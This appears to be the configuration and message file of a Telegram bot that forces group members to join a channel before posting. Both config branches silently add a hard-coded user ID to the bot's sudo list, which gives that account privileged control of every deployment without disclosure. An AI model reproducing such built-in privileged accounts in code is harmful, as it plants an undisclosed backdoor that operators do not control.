import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = ""
    DATABASE_URL = ""
    APP_ID = ""
    API_HASH = ""
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():
      HELP_MSG = [
        ".",

        "**Force Subscribe by Oberon Phelonious**\n\nForce group members to join a specific channel before sending messages in the group.\nI will mute members if they not joined your channel and tell them to join the channel and unmute themself by pressing a button.",
        
        "**Setup**\n\nFirst of all add me in the group as admin with ban users permission and in the channel as admin.\nNote: Only creator of the group can setup me and i will leave the chat if i am not an admin in the chat.",
        
        "**Commmands**\n\n__/ForceSubscribe__ - To get the current settings.\n\n__/ForceSubscribe no/off/disable__ - To turn of ForceSubscribe.\n\n__/ForceSubscribe {channel username}__ - To turn on and setup the channel.\n\n__/ForceSubscribe clear__ - To unmute all members who muted by me__.\n\n*Note:* /FSub is an alias of /ForceSubscribe",
        
        "**Developed by @ShadowPKx**"
      ]

      START_MSG = "**Hey [{}](tg://user?id={})**\nI can force members to join a specific channel before writing messages in the group.\n\nLearn more at /help"
